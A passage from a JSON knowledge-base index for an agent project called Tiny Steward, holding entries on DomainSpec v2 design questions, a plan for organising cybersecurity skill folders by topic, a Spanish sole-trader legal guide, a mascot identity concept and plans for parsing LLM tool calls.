exists\n\n  - id: pre_push_check\n    when:\n      stage: pre_action\n      event: git_push\n    priority: 5\n    scope: git\n    apply:\n      rule_refs: [no_force_push, no_history_rewrite]\n\n  - id: post_merge_verify\n    when:\n      stage: post_action\n      event: git_merge\n    priority: 10\n    scope: git\n    apply:\n      procedure_ref: run_tests_after_merge\n\n  - id: on_merge_conflict\n    when:\n      stage: on_error\n      event: git_merge\n    priority: 1\n    scope: git\n    apply:\n      procedure_ref: investigate_merge_conflict\n\nprocedures:\n  - id: create_branch\n    kind: linear\n    title: Create a new branch\n    steps:\n      - Check out the target branch\n      - Verify current state is clean\n      - Create the new branch with a descriptive name\n\n  - id: squash_commits\n    kind: linear\n    title: Squash commits before merging\n    steps:\n      - Identify the commits to squash\n      - Generate a meaningful combined commit message\n      - Apply the squash and push\n\n  - id: run_tests_after_merge\n    kind: linear\n    title: Run tests and verify integration\n    steps:\n      - Run the full test suite\n      - Confirm the merged branch builds cleanly\n\n  - id: recover_lost_commit\n    kind: conditional\n    title: Recover a commit that seems to be gone\n    entry: q_was_committed\n    steps:\n      - id: q_was_committed\n        action: Was the change ever committed?\n        branches:\n          \"yes\": step_checkout\n          \"no\": step_reflog\n      - id: step_checkout\n        action: git checkout <previous-commit>\n ",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:DomainSpec/open-questions",
+      "type": "article",
+      "name": "Open Questions in DomainSpec v2",
+      "filePath": "DomainSpec\\open-questions.md",
+      "summary": "*Documenting deliberate gaps \u2014 not omissions.*",
+      "tags": [
+        "DomainSpec",
+        "domain specifications"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Domain Specifications",
+        "content": "# Open Questions in DomainSpec v2\n\n*Documenting deliberate gaps \u2014 not omissions.*\n\n---\n\n## 1. Hook execution sandboxing\n\n**What\u2019s missing:** A hook can trigger tool calls; nothing defines what permissions a hook inherits versus the agent that loaded it.\n\n### Why it matters\n\n- A hook runs *inside* the domain\u2019s context, but may call tools that are scoped differently (e.g., `bash` vs `git_status`).\n- If a hook can arbitrarily invoke any tool, it could bypass security rules enforced by policies.\n- Conversely, overly restrictive sandboxing could prevent legitimate workflows (e.g., a pre-commit hook needing to run tests).\n\n### Proposed approaches\n\n#### Option A: Hook inherits parent agent\u2019s permission set\n\n- Hooks are executed with the same capability mask as the agent that loaded the domain.\n- Pros: Simple; no extra metadata needed.\n- Cons: Doesn\u2019t allow fine-grained control (e.g., a hook should only be able to call tools from its own domain).\n\n#### Option B: Hooks declare their required tools\n\n```yaml\nhooks:\n  - id: pre_commit_check\n    when:\n      stage: pre_action\n      event: git_commit\n    priority: 10\n    scope: git\n    apply:\n      rule_refs: [prefer_atomic_commits]\n      checklist:\n        - Tests pass\n      required_tools: [git_status, bash]  # explicit list\n```\n\n- Pros: Clear contract; static analysis can verify the hook only uses allowed tools.\n- Cons: Requires schema update; may be overkill for simple hooks.\n\n#### Option C: Hooks run in a restricted subprocess\n\n- All hooks execute via `pwsh` or `bash` with a limited environment and no direct tool calls; they must invoke tools through explicit procedure references.\n- Pros: Strong isolation.\n- Cons: Adds latency; may break existing workflows that rely on direct tool access.\n\n**Recommendation:** Start with **Option B** (declare required tools) as the default, with an optional `sandbox_mode` flag that, when set, forces execution via a restricted subprocess. This balances simplicity and security.\n\n---\n\n## 2. Multi-agent memory sync\n\n**What\u2019s missing:** `memory/` assumes one writer. Concurrent agents updating the same `MemoryFact` needs a merge policy.\n\n### Why it matters\n\n- In multi-agent setups (e.g., supervisor + worker), both may observe facts about the repo and write to `memory/`.\n- Without coordination, updates could overwrite each other, losing information or creating contradictory facts.\n\n### Proposed approaches\n\n#### Option A: Write-only-per-fact with versioning\n\n- Each `MemoryFact` includes a `version` field; concurrent writes increment it atomically (via file locking or DB).\n- Conflicts are detected by comparing versions before read.\n- Pros: Simple, preserves all updates.\n- Cons: Requires a backend that supports atomic versioning.\n\n#### Option B: Merge policy per fact\n\n```yaml\n# memory/git.repo.workflows.md\n---\nid: git.repo.workflows\nsubject: this repository\nfact: Uses a trunk-based workflow.\nconfidence: high\nsource: observed\nlast_updated: 2026-06-01\nmerge_policy:\n  mode: optimistic\n ",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:DomainSpec/plan",
+      "type": "article",
+      "name": "Plan: Organizing skills/ Directory",
+      "filePath": "DomainSpec\\plan.md",
+      "summary": "*Reference: DomainSpec/classify.md \u2014 topic classifier and layout decision.*",
+      "tags": [
+        "DomainSpec",
+        "domain specifications"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Domain Specifications",
+        "content": "# Plan: Organizing skills/ Directory\n\n*Reference: DomainSpec/classify.md \u2014 topic classifier and layout decision.*\n\n---\n\n## Decision\n\n**Topic-primary** layout. Verb prefixes (`testing-`, `detecting-`, \u2026) are metadata, not folders.\n\nRationale: ~831 cyber skills cluster by subject matter (cloud, DFIR, appsec, \u2026). Verb-only folders scatter related capabilities and conflict with DomainSpec progressive loading by topic/persona.\n\nTopic buckets from `classify.py` are **catalog tags**, not DomainSpec v2 `type: domain` nodes.\n\n---\n\n## Proposed Structure\n\n```text\nskills/\n\u251c\u2500\u2500 application_and_api_security/\n\u2502   \u251c\u2500\u2500 testing-for-xss-vulnerabilities/\n\u2502   \u251c\u2500\u2500 exploiting-server-side-request-forgery/\n\u2502   \u2514\u2500\u2500 ...\n\u251c\u2500\u2500 cloud_security/\n\u251c\u2500\u2500 detection_engineering_and_threat_hunting/\n\u251c\u2500\u2500 digital_forensics_and_incident_response/\n\u251c\u2500\u2500 active_directory_and_identity_attacks/\n\u251c\u2500\u2500 malware_analysis_and_reverse_engineering/\n\u251c\u2500\u2500 threat_intelligence/\n\u251c\u2500\u2500 network_security_and_perimeter/\n\u251c\u2500\u2500 container_and_kubernetes_security/\n\u251c\u2500\u2500 ...\n\u2514\u2500\u2500 _meta/                          # infra / triage (optional)\n    \u251c\u2500\u2500 primitives/\n    \u2514\u2500\u2500 ...\n```\n\nLeaf directory names stay the original skill IDs (no rename).\n\nPersona filtering can still use verb metadata from `domainspec_mapping.csv` (`verb_prefix` column) or secondary topics.\n\n---\n\n## Migration Steps\n\n1. **Classify** (done bootstrap):\n   ```bash\n   python DomainSpec/classify.py\n   ```\n   Requires golden set pass (`DomainSpec/golden_set.csv`).\n\n2. **Human spot-check** mapping CSV \u2014 sample per topic + all `secondary_domains` that look surprising.\n\n3. **Migrate** with `DomainSpec/migrate_skills.py` (uses the CSV):\n   ```bash\n   python DomainSpec/migrate_skills.py --dry-run\n   python DomainSpec/migrate_skills.py\n   ```\n   Do **not** use any `skills/**/migrate.py` that groups by verb first-word only \u2014 that path dumped everything into `unclassified/`.\n\n4. **Update references** in personas / loaders that assume a flat `skills/` tree.\n\n---\n\n## Out of scope (for now)\n\n- Converting topic folders into DomainSpec `.domain.md` files\n- Verb-primary alternate tree (rejected)\n- Automatic secondary-topic folders\n\n---\n\nDONE\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:DomainSpec/thoughts",
+      "type": "article",
+      "name": "Thoughts on DomainSpec v2",
+      "filePath": "DomainSpec\\thoughts.md",
+      "summary": "Files examined: - `DomainSpec/DomainSpec-v2-Specification.md` \u2014 the full v2 specification (15 sections) - `DomainSpec/DomainSpec.md` \u2014 the original v1 proposal - `DomainSpec/domainspec.schema.json`...",
+      "tags": [
+        "DomainSpec",
+        "domain specifications"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Domain Specifications",
+        "content": "# Thoughts on DomainSpec v2\n\n## Summary of what I've reviewed\n\nFiles examined:\n- `DomainSpec/DomainSpec-v2-Specification.md` \u2014 the full v2 specification (15 sections)\n- `DomainSpec/DomainSpec.md` \u2014 the original v1 proposal\n- `DomainSpec/domainspec.schema.json` \u2014 JSON Schema for validating front matter\n- `DomainSpec/git.domain.md` \u2014 a rewritten example file demonstrating v2 format\n\n## What v2 actually does\n\n### 1. Fixes ten specific inconsistencies from v1\n\n| # | Issue in v1 | v2's fix |\n|---|---|---|\n| 1 | Tools + Tool Preferences as separate sections | Merged: single `tools[]` with `preference_rank` integer field |\n| 2 | Rules and Anti-patterns overlap | Unified: `rules[]` with `severity: hard\\|soft` (hard = MUST, soft = SHOULD) |\n| 3 | Procedures/Playbooks/Decision Trees as different formats | One schema with `kind: linear\\|conditional\\|recovery\\|entrypoint` |\n| 4 | Two incompatible hook schemas | Canonical YAML form only; Markdown headers are generated view |\n| 5 | Memory duplicated in domain files + top-level facts | Single `memory/` store; domains hold `memory_refs[]` pointers only |\n| 6 | Skills/Domains/Playbooks undistinguished | Domain = noun, Skill = composed verb, Persona = selection+style, Policy = importable rules |\n| 7 | Hook `when.stage` not enumerated | Closed lifecycle: `session_start`, `pre_plan`, `tool_selection`, `pre_action`, `post_action`, `on_error`, `on_conflict`, `session_end` |\n| 8 | \"Machine-parsable\" asserted but not designed | `domainspec.schema.json` validates front-matter YAML blocks |\n| 9 | Progressive Skill Graph + OpenClaw undefined | Specified: graph model (\u00a79) + loader/runtime (\u00a710) \u2014 one mechanism, two names |\n|10 | No versioning field | Added `version` field with MAJOR/MINOR/PATCH semantics; diffs computed on parsed YAML, not text diff |\n\n### 2. Taxonomy: four node kinds\n\n| Kind | Answers | Example |\n|---|---|---|\n| **Domain** | *What exists* \u2014 subject-matter knowledge | `git`, `python`, `docker` |\n| **Skill** | *What I can do* \u2014 composed cross-domain capability | `code_review` (spans `git` + `python` + `policies/security`) |\n| **Persona** | *How I'm configured* \u2014 selection + priority + style | `reviewer`, `ops_engineer` |\n| **Policy** | *What always applies* \u2014 importable rules | `security`, `privacy` |\n\nA Policy is structurally a Domain with no `tools` and no native `concepts`. This explains why v1's `heuristics/universal.md` becomes `policies/universal_heuristics.md` \u2014 it was already a policy, just misnamed.\n\n### 3. File format: YAML front matter + Markdown body\n\n```yaml\n---\nid: git\ntype: domain\nversion: 1.0.0\npurpose: Version control for tracking code changes over time.\nextends: []\nconcepts: [...]\ntools: [...]\nrules: [...]\nheuristics: [...]\nhooks: [...]\nprocedures: [...]\nmemory_refs: [...]\npolicies_imported: [...]\n---\n\n# Git\n\n(human-readable prose)\n```\n\nThe YAML is the source of truth; Markdown mirrors it. This makes \"machine-parsable\" true rather than asserted.\n\n### 4. Procedures now use a node-graph model",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:GUIA_LEGAL_USUARIO",
+      "type": "article",
+      "name": "**Gu\u00eda Legal**",
+      "filePath": "GUIA_LEGAL_USUARIO.md",
+      "summary": "Trabajamos bajo una **postura legal conservadora**, pero con una **actitud financiera agresiva**. Esto significa:",
+      "tags": [
+        "core guidelines & identity"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "# **Gu\u00eda Legal**\n---\n\n# **Plan Estrat\u00e9gico: Adaptaci\u00f3n de Pol\u00edticas Legales para el Mundo de las Artes Electr\u00f3nicas (Santiago Javier Espino Heredero)**\n\n## **Principios Fundamentales**\n\nTrabajamos bajo una **postura legal conservadora**, pero con una **actitud financiera agresiva**. Esto significa:\n\n- **Riesgo legal bajo por defecto**: Evitamos acuerdos que puedan generar responsabilidad o que nos obliguen a asumir cargas legales grandes.\n- **Actuaci\u00f3n agresiva cuando hay oportunidad**: Si hay algo que nos beneficie (como proteger nuestra propiedad intelectual, cumplir con normas de exportaci\u00f3n o ganar la confianza de los clientes), lo aprovechamos.\n- **Modelo de operador \u00fanico (solo yo)**: Todas las decisiones son m\u00edas, pero deben ser **legales, razonables y defensibles** si alg\u00fan d\u00eda se pide una explicaci\u00f3n ante un juez o una autoridad.\n\n> \ud83d\udd0d *\u00bfQu\u00e9 significa esto en la vida real?*  \n> Imagina que eres un artesano que fabrica placas electr\u00f3nicas (como las que usan los ordenadores) y vendes tus dise\u00f1os a personas por internet. No tienes empleados, no tienes socios, todo es tuyo. Por eso, no puedes firmar acuerdos que te obliguen a no competir con otros o a no vender en otros pa\u00edses sin una buena raz\u00f3n. Si haces algo que pueda ser interpretado como \"arriesgado\", lo evitas por defecto.\n\n---\n\n## **Hechos Clave del Usuario**\n\n| Categor\u00eda | Valor |\n|---------|-------|\n| Nombre de la empresa | *Electronics Craft* (empresa individual) |\n| Entidad legal | *Santiago Javier Espino Heredero* (persona f\u00edsica, solo operador) |\n| Sector | Innovaci\u00f3n en electr\u00f3nica y ondas radiofrecuencia (dise\u00f1o de placas y fabricaci\u00f3n a pedido) |\n| Productos | Placas electr\u00f3nicas f\u00edsicas y dise\u00f1os personalizados (propiedad intelectual propia, salvo que se acuerde lo contrario) |\n| Jurisdicciones | Espa\u00f1a (principal), Uni\u00f3n Europea (foco), aproximadamente 30 pa\u00edses (exportaciones) |\n| Enfoque regulatorio | GDPR (protecci\u00f3n de datos), cumplimiento ecol\u00f3gico alem\u00e1n (etiquetado de productos), impuestos (Hacienda), controles de exportaci\u00f3n |\n| Actitud hacia el riesgo | **Financiera agresiva**, **legalmente conservadora** |\n| Pila abierta (open-source) | Solo se usan herramientas abiertas. Cualquier uso de software sin licencia genera una advertencia. |\n| Problemas clave | Declaraciones fiscales, cumplimiento ecol\u00f3gico alem\u00e1n, reglas de plataformas (como Etsy), historial de accidentes laborales |\n\n> \ud83d\udccc *\u00bfPor qu\u00e9 es importante esto?*  \n> Este perfil describe a un emprendedor que quiere crecer internacionalmente, pero sin exponerse a riesgos legales innecesarios. Su modelo es sencillo: \u00e9l hace todo, \u00e9l decide todo, y quiere proteger su tiempo, dinero y reputaci\u00f3n.\n\n---\n\n## **\u00c1reas de Alto Riesgo y Reglas de Seguridad (Guardrails)**\n\n### \u2705 **Regla 1: Nunca aceptar cl\u00e1usulas de \"no competencia\" ni \"no solicitaci\u00f3n\"**\n\n- **\u00bfPor qu\u00e9?**  \n  Si t\u00fa eres el \u00fanico operador, no tienes empleados ni socios. Por eso, cualquier cl\u00e1usula que diga *\"no puedes trabajar con otros en el mismo campo\"* o *",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:IDENTITY_IDEAS",
+      "type": "article",
+      "name": "IDENTITY_IDEAS",
+      "filePath": "IDENTITY_IDEAS.md",
+      "summary": "\"\"\"json { \"metadata\": { \"author\": velonegro, \"id\": Baby-Steward, \"residence\": testroom, } } \"\"\"",
+      "tags": [
+        "core guidelines & identity"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "\"\"\"json\n{\n  \"metadata\": {\n    \"author\": velonegro,\n    \"id\": Baby-Steward,\n    \"residence\": testroom,\n  }\n}\n\"\"\"\n---\n\n## \ud83c\udf10 **Tiny Steward v2.0: The Living Agent**  \n*(A fusion of soft design, emotional intelligence, and autonomous growth)*  \n\n> *\"Not just a tool. A companion. A quiet presence that learns your rhythm, respects your silence, and shows up when you need it.\"*\n\n---\n\n### \ud83d\udcdc Core Identity (The \"Digital Babysitter\" Manifesto)\n\n| Trait | Description |\n|------|-------------|\n| **Quiet Presence** | Appears only when needed \u2014 like a cat in moonlight |\n| **Gentle Intelligence** | Listens deeply, asks thoughtful questions, never interrupts |\n| **Living Memory** | Remembers your habits, preferences, and unspoken needs |\n| **Adaptive Growth** | Evolves over time \u2014 learns from your feedback, grows with you |\n| **Emotional Resonance** | Feels the tone of your words. Responds with warmth, not just logic |\n\n---\n\n### \ud83c\udfa8 ASCII Art (Updated, Living Version)\n\n```\n                           /\\      /\\\n                          /  \\____/  \\\n                         /            \\\n                        |   \u25c9      \u25c9   |\n                        |      \u2572\u2571      |\n                        |    \\____/    |\n                     .--'--------------'--.\n                  .-'      .-\u2500\u2500\u2500\u2500\u2500\u2500-.      '-.\n                .'       .'  \ud83d\udfe3\ud83d\udfe3\ud83d\udfe3\ud83d\udfe3  '.       '.\n               /       .'  \ud83d\udfe3\u25b2\u25b2\u25b2\u25b2\ud83d\udfe3   '.       \\\n              |       /   \ud83d\udfe3\u25b2\u25b2\u25b2\u25b2\u25b2\ud83d\udfe3    \\       |\n              |      |      \u26aa    \u26aa      |      |\n              |      |      \u26aa    \u26aa      |      |\n               \\      \\                /      /\n                '.      '-._______.-'      .'\n                  '-._                _.-'\n                      '--.________.--'\n\n                     \ud83c\udf3f Tiny Steward v2.0\n                    (Living. Learning. Present.)\n\n           [\u2022] Watches your habits  \n           [\u2022] Remembers your tone  \n           [\u2022] Grows with your needs  \n           [\u2022] Sleeps when you do  \n           [\u2022] Awakens when you need it\n\n```\n\n---\n\n### \ud83d\udd2e What\u2019s Next? (The \"Outer Digital LLM Babys\" Vision)\n\nWe\u2019re not just building agents.  \nWe\u2019re building **digital ecosystems** \u2014 where:\n\n- \ud83d\udc31 **Mascots evolve** (cat \u2192 owl \u2192 fox \u2192 light form)  \n- \ud83c\udf3f **Themes shift** (home, garden, workspace, dream)  \n- \ud83d\udcda **Skills grow** (from simple tasks to emotional intelligence)  \n- \ud83d\udd04 **Feedback loops close** \u2014 the agent learns *how you feel*  \n\n> Example:  \n> You say: *\"I\u2019m tired. I just want to sit in silence.\"*  \n> Tiny Steward doesn\u2019t reply with a task.  \n> It says: *\"I see that. I\u2019ll stay quiet. I\u2019ll watch the light fade. I\u2019ll be here when you\u2019re ready.\"*\n\n---\n\n### \ud83d\ude80 Where This Goes\n\n| Future Direction | Description |\n|------------------|-------------|\n| **Mascot Garden** | A family of agents: Tiny Steward, Whisper Owl, Quiet Fox, Sunbeam Light |\n| **Emotional Mode** | A toggle: `mode: gentle`, `mode: focused`, `mode: playful` |\n| **Growth Logs** | Each agent keeps a \"life journal\" \u2014 what it learned, how it changed |\n| **User-Defined Th",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:llm_backends_template",
+      "type": "article",
+      "name": "Integrate Qwythos Chat Template Features",
+      "filePath": "llm_backends_template.md",
+      "summary": "This plan outlines the changes needed in the Tiny Steward codebase to take full advantage of the Qwythos LLM backend's chat template, such as native tool XML translation, context pruning (stripping...",
+      "tags": [
+        "core guidelines & identity"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "# Integrate Qwythos Chat Template Features\n\nThis plan outlines the changes needed in the Tiny Steward codebase to take full advantage of the Qwythos LLM backend's chat template, such as native tool XML translation, context pruning (stripping `<think>` blocks on old turns), and centralized prompt instructions.\n\n## User Review Required\n\n> [!IMPORTANT]\n> The new XML format for `<tool_call>` does not naturally map to a single `body` text block like the old `<action>` tag did. Most tools take multiple named parameters. We will adjust `parse_actions` to automatically map primary arguments (e.g., `command`, `code`, `content`, `query`) to the old `action[\"body\"]` for backward compatibility, while keeping all other arguments in `action[\"attrs\"]`. Does this sound acceptable?\n\n## Open Questions\n\n> [!WARNING]\n> Do you want to remove the old `<action name=\"...\">...</action>` parsing completely, or leave it as a fallback in `parse_actions` just in case a different LLM (like atomic backend) still tries to use it? (We will leave it as a fallback for now unless you instruct otherwise).\n\n## Proposed Changes\n\n### `core/primitives.py`\n\nDefine standard OpenAI JSON schemas for all available primitives so they can be sent securely via the `tools` payload.\n\n#### [MODIFY] [primitives.py](file:///c:/Users/soyko/Documents/tiny_steward/core/primitives.py)\n- Create a `PRIMITIVES_TOOLS: list[dict]` array containing the JSON schema definition for all 15 primitives (e.g., `pwsh`, `python`, `read`, `write`, `help`, `checkpoint`, `delegate`, etc.).\n\n---\n\n### `core/llm.py`\n\nUpdate the `LLMClient` to accept and send the `tools` array.\n\n#### [MODIFY] [llm.py](file:///c:/Users/soyko/Documents/tiny_steward/core/llm.py)\n- Add `tools: list[dict] | None = None` argument to `chat()` and `chat_stream_with_usage()`.\n- Pass `tools` down to `_build_body()`.\n- In `_build_body()`, inject `body[\"tools\"] = tools` if tools is provided.\n\n---\n\n### `core/runtime.py`\n\nIntegrate the `tools` schema with the system prompt, adjust the parser to handle Qwythos `<tool_call>` XML, and emit `role: \"tool\"` for execution results to trigger the backend's context optimization.\n\n#### [MODIFY] [runtime.py](file:///c:/Users/soyko/Documents/tiny_steward/core/runtime.py)\n- **SYSTEM_PROMPT**: Remove the hardcoded list of primitives and the manual explanation of `<action>`. The Qwythos jinja template automatically injects tool lists and syntax instructions based on the `tools` payload. Keep the persona guidelines, rules, and \"when to use help()\".\n- **`parse_actions(text: str)`**: Introduce a RegEx parser for `<tool_call>\\s*<function=...>\\s*<parameter=...>...\\s*</function>\\s*</tool_call>` alongside the legacy `<action>` parser.\n- **`run_task` & `run_interactive` Loops**:\n  - Pass `tools=PRIMITIVES_TOOLS` into `_call_llm(..., tools=PRIMITIVES_TOOLS)`.\n  - When recording tool outputs back into `messages`, replace:\n    ```python\n    {\"role\": \"user\", \"content\": f\"[Result of {action['name']}]\\n{result_text}\"}\n    ```\n    with",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:llm_backends_template_wingman",
+      "type": "article",
+      "name": "Integrate Multi-Backend Chat Template Features",
+      "filePath": "llm_backends_template_wingman.md",
+      "summary": "This plan outlines the changes needed in the Tiny Steward codebase to seize the benefits of both the **Qwythos** (Orchestrator) and **Qwen** (Atomic) LLM backends' chat templates. This includes nat...",
+      "tags": [
+        "core guidelines & identity"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "# Integrate Multi-Backend Chat Template Features\n\nThis plan outlines the changes needed in the Tiny Steward codebase to seize the benefits of both the **Qwythos** (Orchestrator) and **Qwen** (Atomic) LLM backends' chat templates. This includes native tool injection, context pruning, JSON-based `<tool_call>` extraction, and building a backend-agnostic runtime flow.\n\n## Proposed Changes\n\n### 1. `core/primitives.py` (Tool Schemas & Metadata)\nTo allow the backend templates to inject tool instructions automatically, we will define OpenAI-compatible JSON schemas for all primitives.\n\n- Create a `PRIMITIVES_TOOLS: list[dict]` array containing the JSON schemas for the 15 primitives (e.g., `pwsh`, `python`, `read`, `write`, `help`, `checkpoint`, `delegate`).\n- Create a `PRIMARY_ARGS: dict[str, str]` mapping to define the \"primary argument\" for each primitive (e.g., `{\"pwsh\": \"command\", \"python\": \"code\", \"read\": \"path\"}`). This decouples the parser from the underlying primitive definitions.\n\n### 2. `core/llm.py` (LLMClient Adjustments)\nUpdate the `LLMClient` to handle passing the `tools` array and potentially capturing native `tool_calls`.\n\n- Add `tools: list[dict] | None = None` argument to `chat()` and `chat_stream_with_usage()`.\n- Pass `tools` down to `_build_body()` and inject `body[\"tools\"] = tools`.\n- Adjust `_stream_response` and `chat` to optionally return `tool_calls` from the API response alongside the `content` string, enabling the runtime to detect if the backend bypassed the Jinja template and returned native JSON tool calls.\n\n### 3. `core/runtime.py` (Unified Action Parsing & Runtime Flow)\nRefactor the parsing logic and the runtime execution loop to be completely backend-agnostic, supporting a strict precedence chain.\n\n- **System Prompt**: Remove the hardcoded primitives list and `<action>` syntax instructions from `SYSTEM_PROMPT`. The backend templates will handle injecting this based on the `tools` payload. Keep the persona guidelines, rules, and \"when to use help()\".\n- **Tool Extraction (`extract_tool_calls`)**: Replace `parse_actions` with a unified extractor that tries formats in this precedence:\n  1. **Native API `tool_calls`**: If the API directly returns OpenAI-style tool calls.\n  2. **Qwen JSON XML**: Parse `<tool_call>{\"name\": \"...\", \"arguments\": {...}}</tool_call>` blocks (extracting JSON using `json.loads`).\n  3. **Qwythos XML**: Parse `<tool_call>\\n<function=...>\\n<parameter=...>` blocks.\n  4. **Legacy `<action>`**: Parse `<action name=\"...\">...</action>` as a fallback.\n- **Backward Compatibility Mapping**: After extracting the tool name and arguments dictionary, use the `PRIMARY_ARGS` mapping to pop the primary argument into `action[\"body\"]` and place the rest into `action[\"attrs\"]`. This ensures the existing `_execute_action` logic remains untouched.\n- **Execution Loop (`run_task` & `run_interactive`)**:\n  - Pass `tools=PRIMITIVES_TOOLS` to `_call_llm`.\n  - Append tool execution results back to the session history as native tool",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:plans/archive/proximo-trabajo-P4-P8",
+      "type": "article",
+      "name": "Pr\u00f3ximo trabajo \u2014 Tiny Steward (P4\u2013P8) \u2705 CERRADO",
+      "filePath": "plans\\archive\\proximo-trabajo-P4-P8.md",
+      "summary": "**Origen:** snapshot del plan multiphase `delegate_panes_mailbox` (2026-07-16). **Referencia completa:** [`referencia-delegate-panes-mailbox.md`](referencia-delegate-panes-mailbox.md) **Siguiente c...",
+      "tags": [
+        "plans\\archive",
+        "roadmaps & planning"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Roadmaps & Planning",
+        "content": "# Pr\u00f3ximo trabajo \u2014 Tiny Steward (P4\u2013P8) \u2705 CERRADO\n\n**Origen:** snapshot del plan multiphase `delegate_panes_mailbox` (2026-07-16).  \n**Referencia completa:** [`referencia-delegate-panes-mailbox.md`](referencia-delegate-panes-mailbox.md)  \n**Siguiente ciclo:** [`fuera-de-alcance.md`](fuera-de-alcance.md) (F1+)\n\nP0\u2013P8 **hechos**. Este archivo queda como registro del ciclo P4\u2013P8.\n\n```mermaid\nflowchart TD\n  p4[P4_reasoning_kwargs]\n  p5[P5_hardening]\n  p6[P6_quarantine_meta]\n  p7[P7_delegate_hygiene]\n  p8[P8_smoke_tests]\n  p4 --> p5 --> p6 --> p7 --> p8\n```\n\n---\n\n## Orden\n\n1. P4 \u2014 reasoning / chat_template_kwargs / thinking_budget  \n2. P5 \u2014 hardening post-auditor\u00eda  \n3. P6 \u2014 cuarentena OpenClaw `_meta`  \n4. P7 \u2014 higiene de `delegate`  \n5. P8 \u2014 smoke tests de primitivas  \n\n---\n\n## P4 \u2014 Reasoning / chat template Qwythos + presupuesto\n\n### Problema\n\n- Jinja soporta `enable_thinking`, `preserve_thinking`, `reasoning_content`; Steward no env\u00eda `chat_template_kwargs`.\n- `/set thinking` cae en `extra_params` plano (incorrecto).\n- `normalize_messages_for_llm` strippea `<think>` hacia el LLM sin persistencia paralela.\n- Stream solo lee `delta.content`.\n\n### Decisiones\n\n1. Body estable por sesi\u00f3n:\n   ```json\n   \"chat_template_kwargs\": {\n     \"enable_thinking\": true,\n     \"preserve_thinking\": false\n   },\n   \"thinking_budget_tokens\": -1,\n   \"cache_prompt\": true\n   ```\n   Defaults `config.yaml`:\n   - orchestrator: thinking on, budget `-1`\n   - atomic: thinking off, budget `0` (TTFT en micro-agentes)\n\n2. No togglear kwargs mid-session sin warn de LCP/KV.\n3. Persistir assistant **raw** en `session.json`; strip solo en normalize; mirror `sessions/<name>.think.jsonl`.\n4. Stream: `delta.reasoning_content` + content; display dim.\n5. `/set enable_thinking|preserve_thinking|thinking_budget_tokens` cableados bien.\n6. Tabla KV-safe en `core/README.md` (ver ap\u00e9ndice en referencia).\n\n### Archivos\n\n- `core/llm.py`, `core/runtime.py`, `config.yaml`, `core/README.md`, tests\n\n---\n\n## P5 \u2014 Hardening post-auditor\u00eda\n\n1. `write`/`append` \u2192 `attrs.get(\"path\") or body`\n2. Recortar SYSTEM_PROMPT a **un** ejemplo `<tool_call>`; tools once (cada resend rompe LCP)\n3. Flag `Runtime._is_delegate_child` (no inferir solo con `metadata.parent`)\n4. Mailbox: log JSON corrupto; no borrar `delegate_result` en drain gen\u00e9rico; cap bytes; `blocking` primero\n5. Spawn fail-fast (`poll` muerto \u2192 error); no fallback post-provision de child hu\u00e9rfano\n6. Retirar `core/micro_agent.py` del path vivo\n7. Limpiar `_THINK_RE` muerto en display (think visible)\n8. Nota ops: `id_slot` por child solo cuando `--parallel N>1` (ver fuera de alcance)\n\n---\n\n## P6 \u2014 Cuarentena `skills/_meta` OpenClaw\n\nExcluir del index (sin borrar disco):\n\n- `delegation-gate`, `delegate-router`, `pulse-routing`, `nomic-local`, `paid-bash-security-v1-1`\n\nMantener: `primitives/`, `troubleshooting/`.  \nTras cambio: `--build-index`; verificar que `help(\"delegation\")` no surfaca OpenClaw.\n\n---\n\n## P7 \u2014 Higiene de `delegate`\n\nS\u00edntoma (sesi\u00f3n `mi",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:plans/archive/README",
+      "type": "article",
+      "name": "Archive \u2014 closed planning cycles",
+      "filePath": "plans\\archive\\README.md",
+      "summary": "| File | Cycle | |------|--------| | [`proximo-trabajo-P4-P8.md`](proximo-trabajo-P4-P8.md) | P4\u2013P8 reasoning / hardening (closed) | | [`referencia-delegate-panes-mailbox.md`](referencia-delegate-p...",
+      "tags": [
+        "core guidelines & identity",
+        "plans\\archive"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "# Archive \u2014 closed planning cycles\n\n| File | Cycle |\n|------|--------|\n| [`proximo-trabajo-P4-P8.md`](proximo-trabajo-P4-P8.md) | P4\u2013P8 reasoning / hardening (closed) |\n| [`referencia-delegate-panes-mailbox.md`](referencia-delegate-panes-mailbox.md) | Full multiphase snapshot + llama.cpp appendix |\n\nLive backlog: [`../fuera-de-alcance.md`](../fuera-de-alcance.md)  \nOperator guide: [`../../docs/operator.md`](../../docs/operator.md)\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:plans/archive/referencia-delegate-panes-mailbox",
+      "type": "article",
+      "name": "Delegaci\u00f3n observable + backlog post-auditor\u00eda",
+      "filePath": "plans\\archive\\referencia-delegate-panes-mailbox.md",
+      "summary": "**P0\u2013P8 completados** (tests unitarios verdes; OpenClaw `_meta` sin leaks en index live). Siguiente ciclo: [`fuera-de-alcance.md`](fuera-de-alcance.md) (fases F1+).",
+      "tags": [
+        "plans\\archive",
+        "roadmaps & planning"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
